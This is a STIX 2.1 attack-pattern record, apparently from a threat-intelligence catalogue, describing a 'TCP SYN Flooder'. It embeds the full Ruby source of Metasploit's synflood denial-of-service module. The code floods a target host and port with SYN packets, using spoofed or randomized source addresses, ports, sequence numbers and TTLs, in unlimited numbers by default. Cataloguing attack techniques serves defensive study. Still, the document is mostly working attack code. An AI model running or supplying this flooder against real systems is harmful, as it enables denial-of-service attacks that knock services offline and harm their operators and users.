{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8611f4e6-1f07-4146-8e19-c9ec58471333",
    "created": "2024-08-14T16:24:51.810735Z",
    "modified": "2024-08-14T16:24:51.810739Z",
    "name": "TCP SYN Flooder",
    "description": "A simple TCP SYN flooder",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/tcp/synflood.rb",
            "external_id": "synflood.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Capture\n  include Msf::Auxiliary::Dos\n\n  def initialize\n    super(\n      'Name'        => 'TCP SYN Flooder',\n      'Description' => 'A simple TCP SYN flooder',\n      'Author'      => 'kris katterjohn',\n      'License'     => MSF_LICENSE\n    )\n\n    register_options([\n      Opt::RPORT(80),\n      OptAddress.new('SHOST', [false, 'The spoofable source address (else randomizes)']),\n      OptInt.new('SPORT', [false, 'The source port (else randomizes)']),\n      OptInt.new('NUM', [false, 'Number of SYNs to send (else unlimited)'])\n    ])\n\n    deregister_options('FILTER','PCAPFILE')\n  end\n\n  def sport\n    datastore['SPORT'].to_i.zero? ? rand(65535)+1 : datastore['SPORT'].to_i\n  end\n\n  def rport\n    datastore['RPORT'].to_i\n  end\n\n  def srchost\n    datastore['SHOST'] || [rand(0x100000000)].pack('N').unpack('C*').join('.')\n  end\n\n  def run\n    open_pcap\n\n    sent = 0\n    num = datastore['NUM'] || 0\n\n    print_status(\"SYN flooding #{rhost}:#{rport}...\")\n\n    p = PacketFu::TCPPacket.new\n    p.ip_saddr = srchost\n    p.ip_daddr = rhost\n    p.tcp_dport = rport\n    p.tcp_flags.syn = 1\n\n    while (num <= 0) or (sent < num)\n      p.ip_ttl = rand(128)+128\n      p.tcp_win = rand(4096)+1\n      p.tcp_sport = sport\n      p.tcp_seq = rand(0x100000000)\n      p.recalc\n      break unless capture_sendto(p,rhost)\n      sent += 1\n    end\n\n    close_pcap\n  end\nend\n"
}